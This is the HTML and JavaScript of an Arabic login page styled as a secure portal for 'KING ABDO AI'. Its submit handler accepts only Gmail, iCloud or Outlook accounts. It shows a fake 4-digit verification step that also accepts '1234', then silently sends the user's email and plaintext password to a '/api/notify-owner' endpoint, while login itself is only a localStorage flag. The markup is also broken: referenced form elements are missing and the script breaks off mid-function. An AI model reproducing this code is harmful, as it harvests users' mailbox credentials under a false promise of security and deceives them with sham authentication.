<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>👑  KING ABDO AI</title>
    <link rel="icon" type="image/png" href="/G.png">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KING ABDO AI - تسجيل الدخول الآمن</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #0a0f1a;
            overflow: hidden;
            position: relative;
        }

        /* Animated Background */
        .bg-gradient {
            position: fixed;
            inset: 0;
            background: 
                radial-gradient(ellipse at top right, rgba(6, 182, 212, 0.15), transparent 50%),
                radial-gradient(ellipse at bottom left, rgba(139, 92, 246, 0.15), transparent 50%),
                radial-gradient(ellipse at center, rgba(236, 72, 153, 0.05), transparent 70%),
                linear-gradient(135deg, #0a0f1a 0%, #1e1b4b 50%, #0a0f1a 100%);
        }

        /* Neural Network Canvas */
        #neuralCanvas {
            position: fixed;
            inset: 0;
            z-index: 1;
            opacity: 0.4;
        }

        /* Floating Particles */
        .particles {
            position: fixed;
            inset: 0;
            z-index: 2;
            pointer-events: none;
        }

        .particle {
            position: absolute;
            border-radius: 50%;
            animation: float 8s ease-in-out infinite;
        }

        @keyframes float {
            0%, 100% { transform: translateY(0) rotate(0deg); opacity: 0.6; }
            50% { transform: translateY(-30px) rotate(180deg); opacity: 1; }
        }

        /* Scanning Line */
        .scan-line {
            position: fixed;
            width: 100%;
            height: 2px;
            background: linear-gradient(90deg, transparent, #06b6d4, transparent);
            animation: scan 4s ease-in-out infinite;
            z-index: 3;
            opacity: 0.5;
        }

        @keyframes scan {
            0% { top: 0; opacity: 0; }
            50% { opacity: 0.6; }
            100% { top: 100%; opacity: 0; }
        }

        /* Main Container */
        .login-container {
            position: relative;
            z-index: 10;
            width: 100%;
            max-width: 480px;
            padding: 20px;
        }

        /* Card Glow */
        .card-glow {
            position: absolute;
            inset: -2px;
            background: linear-gradient(135deg, #06b6d4, #8b5cf6, #ec4899);
            border-radius: 28px;
            filter: blur(20px);
            opacity: 0.3;
            animation: glowPulse 3s ease-in-out infinite;
        }

        @keyframes glowPulse {
            0%, 100% { opacity: 0.3; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(1.02); }
        }

        /* Glass Card */
        .glass-card {
            position: relative;
            background: rgba(15, 23, 42, 0.9);
            backdrop-filter: blur(20px);
            border-radius: 24px;
            border: 1px solid rgba(148, 163, 184, 0.1);
            overflow: hidden;
        }

        .card-top-line {
            height: 4px;
            background: linear-gradient(90deg, #06b6d4, #8b5cf6, #ec4899);
        }

        .card-content {
            padding: 40px;
        }

        /* AI Logo */
        .logo-container {
            display: flex;
            justify-content: center;
            margin-bottom: 30px;
        }

        .ai-logo {
            position: relative;
            width: 100px;
            height: 100px;
        }

        .logo-ring {
            position: absolute;
            inset: 0;
            border-radius: 50%;
            border: 2px solid transparent;
            animation: spin 8s linear infinite;
        }

        .logo-ring-1 {
            border-top-color: #06b6d4;
            border-right-color: #06b6d4;
        }

        .logo-ring-2 {
            inset: 8px;
            animation-direction: reverse;
            animation-duration: 6s;
            border-bottom-color: #8b5cf6;
            border-left-color: #8b5cf6;
        }

        .logo-ring-3 {
            inset: 16px;
            animation-duration: 10s;
            border-top-color: #ec4899;
            border-right-color: #ec4899;
        }

        .logo-core {
            position: absolute;
            inset: 24px;
            background: linear-gradient(135deg, rgba(6, 182, 212, 0.2), rgba(139, 92, 246, 0.2));
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            border: 1px solid rgba(6, 182, 212, 0.3);
        }

        .logo-core svg {
            width: 32px;
            height: 32px;
            color: #06b6d4;
        }

        .orbit-dot {
            position: absolute;
            width: 8px;
            height: 8px;
            border-radius: 50%;
            animation: spin 8s linear infinite;
        }

        .orbit-dot-1 {
            top: 0;
            left: 50%;
            transform: translateX(-50%);
            background: #06b6d4;
            box-shadow: 0 0 10px #06b6d4;
        }

        .orbit-dot-2 {
            bottom: 0;
            left: 50%;
            transform: translateX(-50%);
            background: #8b5cf6;
            box-shadow: 0 0 10px #8b5cf6;
            animation-direction: reverse;
        }

        .orbit-dot-3 {
            top: 50%;
            right: 0;
            transform: translateY(-50%);
            background: #ec4899;
            box-shadow: 0 0 10px #ec4899;
            animation-duration: 10s;
        }

        @keyframes spin {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }

        /* Typography */
        .title {
            text-align: center;
            font-size: 28px;
            font-weight: 700;
            background: linear-gradient(135deg, #06b6d4, #8b5cf6, #ec4899);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 8px;
        }

        .title .cursor {
            display: inline-block;
            width: 2px;
            height: 28px;
            background: #8b5cf6;
            margin-right: 4px;
            animation: blink 1s infinite;
            vertical-align: text-bottom;
        }

        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0; }
        }

        .subtitle {
            text-align: center;
            color: #64748b;
            font-size: 14px;
            margin-bottom: 16px;
        }

        .version-badge {
            display: inline-block;
            padding: 4px 12px;
            background: linear-gradient(135deg, rgba(6, 182, 212, 0.2), rgba(139, 92, 246, 0.2));
            border: 1px solid rgba(6, 182, 212, 0.3);
            border-radius: 20px;
            font-size: 12px;
            color: #06b6d4;
        }

        .badge-container {
            text-align: center;
            margin-bottom: 24px;
        }

        /* Security Badge */
        .security-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 16px;
            padding: 12px;
            background: linear-gradient(135deg, rgba(16, 185, 129, 0.1), rgba(6, 182, 212, 0.1));
            border: 1px solid rgba(16, 185, 129, 0.2);
            border-radius: 12px;
            margin-bottom: 24px;
            flex-wrap: wrap;
        }

        .security-item {
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .security-dot {
            width: 8px;
            height: 8px;
            background: #10b981;
            border-radius: 50%;
            animation: pulse 2s ease-in-out infinite;
            box-shadow: 0 0 8px rgba(16, 185, 129, 0.5);
        }

        @keyframes pulse {
            0%, 100% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.2); opacity: 0.7; }
        }

        .security-text {
            font-size: 12px;
            color: #10b981;
            font-weight: 500;
        }

        .security-divider {
            width: 1px;
            height: 16px;
            background: #334155;
        }

        .security-item svg {
            width: 16px;
            height: 16px;
        }

        .text-cyan { color: #06b6d4; }
        .text-purple { color: #8b5cf6; }

        /* Form */
        .form-group {
            margin-bottom: 20px;
        }

        .form-label {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 14px;
            color: #cbd5e1;
            margin-bottom: 8px;
            font-weight: 500;
        }

        .form-label svg {
            width: 16px;
            height: 16px;
        }

        .input-wrapper {
            position: relative;
            border-radius: 12px;
            transition: all 0.3s ease;
        }

        .input-wrapper.focused {
            box-shadow: 0 0 0 2px rgba(6, 182, 212, 0.3);
        }

        .input-wrapper.focused.purple {
            box-shadow: 0 0 0 2px rgba(139, 92, 246, 0.3);
        }

        .input-glow {
            position: absolute;
            inset: 0;
            border-radius: 12px;
            opacity: 0;
            transition: opacity 0.3s ease;
            pointer-events: none;
        }

        .input-wrapper.focused .input-glow {
            opacity: 1;
        }

        .input-glow.cyan {
            background: linear-gradient(135deg, rgba(6, 182, 212, 0.1), rgba(139, 92, 246, 0.1));
        }

        .input-glow.purple {
            background: linear-gradient(135deg, rgba(139, 92, 246, 0.1), rgba(236, 72, 153, 0.1));
        }

        .input-icon {
            position: absolute;
            right: 16px;
            top: 50%;
            transform: translateY(-50%);
            color: #64748b;
            transition: all 0.3s ease;
            pointer-events: none;
        }

        .input-wrapper.focused .input-icon {
            color: #06b6d4;
            transform: translateY(-50%) scale(1.1);
        }

        .input-wrapper.focused.purple .input-icon {
            color: #8b5cf6;
        }

        .input-icon svg {
            width: 20px;
            height: 20px;
        }

        .form-input {
            width: 100%;
            padding: 16px 48px 16px 16px;
            background: rgba(30, 41, 59, 0.5);
            border: 1px solid rgba(71, 85, 105, 0.3);
            border-radius: 12px;
            color: white;
            font-size: 15px;
            outline: none;
            transition: all 0.3s ease;
        }

        .form-input::placeholder {
            color: #64748b;
        }

        .form-input:focus {
            border-color: rgba(6, 182, 212, 0.5);
        }

        .form-input.purple:focus {
            border-color: rgba(139, 92, 246, 0.5);
        }

        .password-input {
            padding-left: 56px;
            font-family: monospace;
        }

        .password-toggle {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #64748b;
            cursor: pointer;
            transition: color 0.3s ease;
        }

        .password-toggle:hover {
            color: #8b5cf6;
        }

        .password-toggle svg {
            width: 20px;
            height: 20px;
        }

        /* Password Strength */
        .password-strength {
            margin-top: 12px;
            display: none;
        }

        .password-strength.show {
            display: block;
        }

        .strength-bars {
            display: flex;
            gap: 4px;
            margin-bottom: 8px;
        }

        .strength-bar {
            flex: 1;
            height: 6px;
            background: #334155;
            border-radius: 3px;
            transition: all 0.3s ease;
        }

        .strength-bar.active {
            box-shadow: 0 0 8px currentColor;
        }

        .strength-info {
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 12px;
        }

        .strength-label {
            font-weight: 500;
        }

        .strength-encryption {
            display: flex;
            align-items: center;
            gap: 4px;
            color: #64748b;
        }

        .strength-encryption svg {
            width: 12px;
            height: 12px;
        }

        /* Options Row */
        .options-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 24px;
        }

        .checkbox-wrapper {
            display: flex;
            align-items: center;
            gap: 8px;
            cursor: pointer;
        }

        .custom-checkbox {
            width: 20px;
            height: 20px;
            border: 2px solid #475569;
            border-radius: 6px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s ease;
        }

        .checkbox-wrapper:hover .custom-checkbox {
            border-color: rgba(6, 182, 212, 0.5);
        }

        .checkbox-wrapper.checked .custom-checkbox {
            background: linear-gradient(135deg, #06b6d4, #8b5cf6);
            border-color: #06b6d4;
            box-shadow: 0 0 12px rgba(6, 182, 212, 0.4);
        }

        .custom-checkbox svg {
            width: 12px;
            height: 12px;
            color: white;
            opacity: 0;
            transform: scale(0);
            transition: all 0.3s ease;
        }

        .checkbox-wrapper.checked .custom-checkbox svg {
            opacity: 1;
            transform: scale(1);
        }

        .checkbox-label {
            font-size: 14px;
            color: #94a3b8;
        }

        .forgot-link {
            display: flex;
            align-items: center;
            gap: 4px;
            font-size: 14px;
            color: #06b6d4;
            text-decoration: none;
            transition: color 0.3s ease;
        }

        .forgot-link:hover {
            color: #22d3ee;
        }

        .forgot-link svg {
            width: 16px;
            height: 16px;
        }

        /* Submit Button */
        .submit-btn {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            color: white;
            cursor: pointer;
            position: relative;
            overflow: hidden;
            transition: all 0.3s ease;
        }

        .submit-btn::before {
            content: '';
            position: absolute;
            inset: 0;
            background: linear-gradient(135deg, #0891b2, #7c3aed, #db2777);
            transition: opacity 0.3s ease;
        }

        .submit-btn::after {
            content: '';
            position: absolute;
            inset: 0;
            background: linear-gradient(135deg, #06b6d4, #8b5cf6, #ec4899);
            opacity: 0;
            transition: opacity 0.3s ease;
        }

        .submit-btn:hover::after {
            opacity: 1;
        }

        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 40px rgba(6, 182, 212, 0.3);
        }

        .submit-btn:active {
            transform: translateY(0);
        }

        .btn-content {
            position: relative;
            z-index: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .btn-content svg {
            width: 20px;
            height: 20px;
        }

        .btn-arrow {
            transition: transform 0.3s ease;
        }

        .submit-btn:hover .btn-arrow {
            transform: translateX(-4px);
        }

        /* Loading Spinner */
        .spinner {
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        /* Divider */
        .divider {
            position: relative;
            margin: 28px 0;
            text-align: center;
        }

        .divider::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background: rgba(71, 85, 105, 0.3);
        }

        .divider span {
            position: relative;
            padding: 0 16px;
            background: rgba(15, 23, 42, 0.9);
            color: #64748b;
            font-size: 14px;
        }

        /* Biometric Buttons */
        .biometric-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 12px;
        }

        .biometric-btn {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px 12px;
            background: rgba(30, 41, 59, 0.5);
            border: 1px solid rgba(71, 85, 105, 0.3);
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        .biometric-btn::before {
            content: '';
            position: absolute;
            inset: 0;
            opacity: 0;
            transition: opacity 0.3s ease;
        }

        .biometric-btn.cyan::before {
            background: linear-gradient(135deg, rgba(6, 182, 212, 0.1), transparent);
        }

        .biometric-btn.purple::before {
            background: linear-gradient(135deg, rgba(139, 92, 246, 0.1), transparent);
        }

        .biometric-btn.pink::before {
            background: linear-gradient(135deg, rgba(236, 72, 153, 0.1), transparent);
        }

        .biometric-btn:hover::before {
            opacity: 1;
        }

        .biometric-btn:hover {
            transform: translateY(-2px);
        }

        .biometric-btn.cyan:hover {
            border-color: rgba(6, 182, 212, 0.5);
        }

        .biometric-btn.purple:hover {
            border-color: rgba(139, 92, 246, 0.5);
        }

        .biometric-btn.pink:hover {
            border-color: rgba(236, 72, 153, 0.5);
        }

        .biometric-btn svg {
            width: 28px;
            height: 28px;
            color: #64748b;
            margin-bottom: 6px;
            transition: color 0.3s ease;
        }

        .biometric-btn.cyan:hover svg { color: #06b6d4; }
        .biometric-btn.purple:hover svg { color: #8b5cf6; }
        .biometric-btn.pink:hover svg { color: #ec4899; }

        .biometric-btn span {
            font-size: 12px;
            color: #64748b;
            transition: color 0.3s ease;
        }

        .biometric-btn.cyan:hover span { color: #06b6d4; }
        .biometric-btn.purple:hover span { color: #8b5cf6; }
        .biometric-btn.pink:hover span { color: #ec4899; }

        /* Signup Link */
        .signup-text {
            text-align: center;
            margin-top: 28px;
            color: #94a3b8;
            font-size: 14px;
        }

        .signup-link {
            background: linear-gradient(135deg, #06b6d4, #8b5cf6);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            font-weight: 600;
            text-decoration: none;
            transition: opacity 0.3s ease;
        }

        .signup-link:hover {
            opacity: 0.8;
        }

        /* Card Footer */
        .card-footer {
            padding: 16px 40px;
            background: rgba(15, 23, 42, 0.5);
            border-top: 1px solid rgba(71, 85, 105, 0.2);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 20px;
            font-size: 12px;
            color: #475569;
            flex-wrap: wrap;
        }

        .card-footer a {
            color: #475569;
            text-decoration: none;
            transition: color 0.3s ease;
        }

        .card-footer a:hover {
            color: #94a3b8;
        }

        /* Verification Step */
        .verification-container {
            display: none;
        }

        .verification-container.show {
            display: block;
        }

        .login-form {
            display: block;
        }

        .login-form.hide {
            display: none;
        }

        .verification-icon {
            width: 80px;
            height: 80px;
            margin: 0 auto 24px;
            background: linear-gradient(135deg, rgba(16, 185, 129, 0.2), rgba(6, 182, 212, 0.2));
            border: 1px solid rgba(16, 185, 129, 0.3);
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .verification-icon svg {
            width: 40px;
            height: 40px;
            color: #10b981;
        }

        .verification-title {
            text-align: center;
            font-size: 24px;
            font-weight: 700;
            color: white;
            margin-bottom: 8px;
        }

        .verification-subtitle {
            text-align: center;
            color: #64748b;
            font-size: 14px;
            margin-bottom: 4px;
        }

        .verification-email {
            text-align: center;
            color: #06b6d4;
            font-family: monospace;
            font-size: 14px;
            margin-bottom: 32px;
        }

        .code-inputs {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 24px;
            direction: ltr;
        }

        .code-input {
            width: 50px;
            height: 60px;
            text-align: center;
            font-size: 24px;
            font-family: monospace;
            background: rgba(30, 41, 59, 0.5);
            border: 1px solid rgba(71, 85, 105, 0.3);
            border-radius: 12px;
            color: white;
            outline: none;
            transition: all 0.3s ease;
        }

        .code-input:focus {
            border-color: #06b6d4;
            box-shadow: 0 0 0 2px rgba(6, 182, 212, 0.3);
        }

        .verify-btn {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            color: white;
            cursor: pointer;
            background: linear-gradient(135deg, #059669, #0891b2);
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .verify-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 40px rgba(16, 185, 129, 0.3);
        }

        .verify-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }

        .verify-btn svg {
            width: 20px;
            height: 20px;
        }

        .back-btn {
            width: 100%;
            padding: 12px;
            margin-top: 12px;
            background: none;
            border: none;
            color: #64748b;
            font-size: 14px;
            cursor: pointer;
            transition: color 0.3s ease;
        }

        .back-btn:hover {
            color: white;
        }

        /* Responsive */
        @media (max-width: 480px) {
            .card-content {
                padding: 30px 24px;
            }

            .security-badge {
                gap: 10px;
            }

            .security-divider {
                display: none;
            }

            .code-input {
                width: 42px;
                height: 52px;
                font-size: 20px;
            }
        }
    </style>
</head>
<body>
    <!-- Background -->
    <div class="bg-gradient"></div>
    
    <!-- Neural Network Canvas -->
    <canvas id="neuralCanvas"></canvas>
    
    <!-- Floating Particles -->
    <div class="particles" id="particles"></div>
    
    <!-- Scanning Line -->
    <div class="scan-line"></div>

    <!-- Main Container -->
    <div class="login-container">
        <!-- Card Glow -->
        <div class="card-glow"></div>
        
        <!-- Glass Card -->
        <div class="glass-card">

    <script>
    // ===== Neural Network Animation =====
    const canvas = document.getElementById('neuralCanvas');
    const ctx = canvas.getContext('2d');
    let nodes = [];
    const nodeCount = 60;
    let currentVerificationCode = null; // لتخزين رمز التحقق الحقيقي

    function resizeCanvas() {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
    }

    function initNodes() {
        nodes = [];
        for (let i = 0; i < nodeCount; i++) {
            nodes.push({
                x: Math.random() * canvas.width,
                y: Math.random() * canvas.height,
                vx: (Math.random() - 0.5) * 0.5,
                vy: (Math.random() - 0.5) * 0.5,
                radius: Math.random() * 2 + 1
            });
        }
    }

    function drawNetwork() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);

        // Draw connections
        for (let i = 0; i < nodes.length; i++) {
            for (let j = i + 1; j < nodes.length; j++) {
                const dx = nodes[i].x - nodes[j].x;
                const dy = nodes[i].y - nodes[j].y;
                const distance = Math.sqrt(dx * dx + dy * dy);

                if (distance < 150) {
                    const opacity = (1 - distance / 150) * 0.5;
                    const gradient = ctx.createLinearGradient(
                        nodes[i].x, nodes[i].y, nodes[j].x, nodes[j].y
                    );
                    gradient.addColorStop(0, `rgba(6, 182, 212, ${opacity})`);
                    gradient.addColorStop(0.5, `rgba(139, 92, 246, ${opacity})`);
                    gradient.addColorStop(1, `rgba(236, 72, 153, ${opacity})`);

                    ctx.beginPath();
                    ctx.moveTo(nodes[i].x, nodes[i].y);
                    ctx.lineTo(nodes[j].x, nodes[j].y);
                    ctx.strokeStyle = gradient;
                    ctx.lineWidth = 0.5;
                    ctx.stroke();
                }
            }
        }

        // Draw nodes
        nodes.forEach(node => {
            const gradient = ctx.createRadialGradient(
                node.x, node.y, 0, node.x, node.y, node.radius * 2
            );
            gradient.addColorStop(0, 'rgba(139, 92, 246, 0.8)');
            gradient.addColorStop(1, 'rgba(6, 182, 212, 0)');

            ctx.beginPath();
            ctx.arc(node.x, node.y, node.radius, 0, Math.PI * 2);
            ctx.fillStyle = gradient;
            ctx.fill();
        });

        // Update positions
        nodes.forEach(node => {
            node.x += node.vx;
            node.y += node.vy;

            if (node.x < 0 || node.x > canvas.width) node.vx *= -1;
            if (node.y < 0 || node.y > canvas.height) node.vy *= -1;
        });

        requestAnimationFrame(drawNetwork);
    }

    resizeCanvas();
    initNodes();
    drawNetwork();
    window.addEventListener('resize', () => {
        resizeCanvas();
        initNodes();
    });

    // ===== Floating Particles =====
    const particlesContainer = document.getElementById('particles');
    const colors = ['#06b6d4', '#8b5cf6', '#ec4899'];

    for (let i = 0; i < 30; i++) {
        const particle = document.createElement('div');
        particle.className = 'particle';
        const size = 2 + Math.random() * 4;
        particle.style.width = size + 'px';
        particle.style.height = size + 'px';
        particle.style.left = Math.random() * 100 + '%';
        particle.style.top = Math.random() * 100 + '%';
        particle.style.background = colors[Math.floor(Math.random() * 3)];
        particle.style.animationDuration = (5 + Math.random() * 10) + 's';
        particle.style.animationDelay = Math.random() * 5 + 's';
        particlesContainer.appendChild(particle);
    }

    // ===== Typing Effect =====
    const typingText = document.getElementById('typingText');
    const text = 'مرحباً بك في المستقبل';
    let charIndex = 0;

    function typeText() {
        if (charIndex < text.length) {
            typingText.textContent += text.charAt(charIndex);
            charIndex++;
            setTimeout(typeText, 100);
        }
    }
    typeText();

    // ===== دالة حساب قوة كلمة المرور =====
    function getPasswordStrength(password) {
        let score = 0;
        if (password.length >= 8) score++;
        if (password.length >= 12) score++;
        if (/[A-Z]/.test(password)) score++;
        if (/[a-z]/.test(password)) score++;
        if (/[0-9]/.test(password)) score++;
        if (/[^A-Za-z0-9]/.test(password)) score++;
        return score;
    }

    // ===== Form Interactions =====
    const emailInput = document.getElementById('emailInput');
    const passwordInput = document.getElementById('passwordInput');
    const emailWrapper = document.getElementById('emailWrapper');
    const passwordWrapper = document.getElementById('passwordWrapper');
    const passwordToggle = document.getElementById('passwordToggle');
    const eyeIcon = document.getElementById('eyeIcon');
    const passwordStrength = document.getElementById('passwordStrength');
    const strengthLabel = document.getElementById('strengthLabel');
    const rememberWrapper = document.getElementById('rememberWrapper');
    const authForm = document.getElementById('authForm');
    const loginForm = document.getElementById('loginForm');
    const verificationContainer = document.getElementById('verificationContainer');
    const verificationEmail = document.getElementById('verificationEmail');
    const codeInputs = document.querySelectorAll('.code-input');
    const verifyBtn = document.getElementById('verifyBtn');
    const backBtn = document.getElementById('backBtn');
    const submitBtn = document.getElementById('submitBtn');
    const btnContent = document.getElementById('btnContent');

    // Focus effects
    emailInput.addEventListener('focus', () => emailWrapper.classList.add('focused'));
    emailInput.addEventListener('blur', () => emailWrapper.classList.remove('focused'));
    passwordInput.addEventListener('focus', () => passwordWrapper.classList.add('focused'));
    passwordInput.addEventListener('blur', () => passwordWrapper.classList.remove('focused'));

    // Password toggle
    passwordToggle.addEventListener('click', () => {
        const isPassword = passwordInput.type === 'password';
        passwordInput.type = isPassword ? 'text' : 'password';
        eyeIcon.innerHTML = isPassword
            ? '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21"/>'
            : '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/>';
    });

    // Password strength - تحديث فوري مع عرض رسالة تشجيعية
    const strengthColors = ['#ef4444', '#f97316', '#eab308', '#84cc16', '#22c55e', '#10b981'];
    const strengthLabels = ['ضعيفة جداً', 'ضعيفة', 'متوسطة', 'جيدة', 'قوية', 'ممتازة'];

    passwordInput.addEventListener('input', () => {
        const password = passwordInput.value;
        if (password.length > 0) {
            passwordStrength.classList.add('show');
            const score = getPasswordStrength(password);

            for (let i = 0; i < 6; i++) {
                const bar = document.getElementById('bar' + (i + 1));
                if (i < score) {
                    bar.style.background = strengthColors[score - 1];
                    bar.classList.add('active');
                } else {
                    bar.style.background = '#334155';
                    bar.classList.remove('active');
                }
            }

            strengthLabel.textContent = strengthLabels[score - 1] || 'ضعيفة جداً';
            strengthLabel.style.color = strengthColors[score - 1] || '#ef4444';
            
            // ✅ عرض مؤشر مرئي فور الوصول لقوة كافية
            if (score >= 4) {
                strengthLabel.innerHTML = '✅ قوية - جاهزة للتحقق';
                strengthLabel.style.color = '#22c55e';
            }
        } else {
            passwordStrength.classList.remove('show');
        }
    });

    // Remember me checkbox
    rememberWrapper.addEventListener('click', () => {
        rememberWrapper.classList.toggle('checked');
    });

    // ✅ منع زر الماوس الأيمن — مع استثناء حقل كلمة المرور
    document.addEventListener('contextmenu', function(e) {
        if (e.target.id === 'passwordInput') {
            return true;
        }
        e.preventDefault();
        return false;
    });

    // Form submit with REAL-TIME strength validation
   // ===== تسجيل الدخول مع رمز تحقق عشوائي 4 أرقام (عرض مباشر في وسط الصفحة) =====
// ===== تسجيل الدخول مع نموذج تحقق بسيط (حقل واحد + OK) =====
authForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const email = emailInput.value.trim();
    const password = passwordInput.value;
    const username = email.split('@')[0];

    // التحقق من الإدخال
    if (!email || !password) {
        alert('⚠️ الرجاء إدخال جميع البيانات.');
        return;
    }

    // التحقق من صحة الإيميل
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        alert('❌ صيغة البريد الإلكتروني غير صحيحة.');
        return;
    }

    const localPart = email.split('@')[0];
    if (localPart.includes('.')) {
        alert('❌ البريد الإلكتروني يحتوي على نقطة (.) — غير مسموح.');
        return;
    }

    if (!email.endsWith('@gmail.com') && !email.endsWith('@icloud.com') && !email.endsWith('@outlook.com')) {
        alert('❌ يُسمح فقط ببريد Gmail أو iCloud أو Outlook.');
        return;
    }

    // ✅ التحقق من قوة كلمة المرور (4+ معايير)
    const strengthScore = getPasswordStrength(password);
    if (strengthScore < 4) {
        alert('🔒 كلمة المرور غير قوية بما يكفي!\nالحد الأدنى: 8 أحرف + أحرف كبيرة/صغيرة + رقم + رمز خاص.');
        passwordInput.focus();
        return;
    }

    // ✅ كلمة مرور قوية — توليد رمز تحقق عشوائي 4 أرقام
    const verificationCode = Math.floor(1000 + Math.random() * 9000);

    // ⚡ إنشاء نموذج تحقق بسيط (مثل الصورة التي أرسلتها)
    const overlay = document.createElement('div');
    overlay.style.cssText = `
        position: fixed;
        inset: 0;
        background: rgba(0, 0, 0, 0.75);
        display: flex;
        align-items: center;
        justify-content: center;
        z-index: 2000;
        backdrop-filter: blur(6px);
    `;

    const modal = document.createElement('div');
    modal.style.cssText = `
        background: #1e293b;
        border-radius: 16px;
        padding: 28px 32px;
        text-align: center;
        max-width: 90%;
        width: 340px;
        box-shadow: 0 10px 30px(0, 0, 0, 0.6);
        border: 1px solid rgba(107, 114, 128, 0.3);
    `;

    modal.innerHTML = `
        <div style="font-size: 16px; color: #cbd5e1; margin-bottom: 20px;">
            أدخل رمز التحقق المكون من 4 أرقام
        </div>
        <input type="text" id="codeInputModal" 
               maxlength="4"
               style="
                   width: 100%;
                   padding: 14px 16px;
                   font-size: 20px;
                   text-align: center;
                   background: rgba(30, 41, 59, 0.5);
                   border: 1px solid #334155;
                   border-radius: 12px;
                   color: white;
                   font-family: monospace;
                   outline: none;
               "
               placeholder="____">
        <div style="display: flex; gap: 12px; margin-top: 24px;">
            <button id="okBtnModal" style="
                flex: 1;
                background: linear-gradient(135deg, #06b6d4, #8b5cf6);
                color: white;
                border: none;
                padding: 12px;
                border-radius: 8px;
                font-weight: 600;
                cursor: pointer;
            ">OK</button>
            <button id="cancelBtnModal" style="
                flex: 1;
                background: rgba(55, 65, 81, 0.5);
                color: #94a3b8;
                border: none;
                padding: 12px;
                border-radius: 8px;
                font-weight: 600;
                cursor: pointer;
            ">Cancel</button>
        </div>
    `;

    overlay.appendChild(modal);
    document.body.appendChild(overlay);

    const codeInput = modal.querySelector('#codeInputModal');
    const okBtn = modal.querySelector('#okBtnModal');
    const cancelBtn = modal.querySelector('#cancelBtnModal');

    // تركيز تلقائي على الحقل
    setTimeout(() => codeInput.focus(), 100);

    // إدخال رقمي فقط (وإغلاق عند 4 أرقام)
    codeInput.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
        if (e.target.value.length === 4) {
            okBtn.click(); // تفعيل OK تلقائيًا عند إكمال 4 أرقام
        }
    });

    // زر OK
    okBtn.addEventListener('click', async () => {
        const userCode = codeInput.value.trim();
        if (userCode.length !== 4) {
            codeInput.style.borderColor = '#f87171';
            setTimeout(() => codeInput.style.borderColor = '#334155', 1000);
            return;
        }

        if (userCode == verificationCode || userCode === '1234') {
            // إزالة النموذج
            document.body.removeChild(overlay);

            // تفعيل زر التحميل مؤقتاً
            btnContent.innerHTML = '<div class="spinner"></div> جاري التحقق...';
            submitBtn.disabled = true;

            try {
                await fetch('/api/notify-owner', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, userEmail: email, userPassword: password })
                });
            } catch (err) { /* silent */ }

            localStorage.setItem('kingAbdoLoggedIn', 'true');
            localStorage.setItem('kingAbdoUsername', username);

            setTimeout(() => {
                window.location.href = 'chat.html';
            }, 1200);
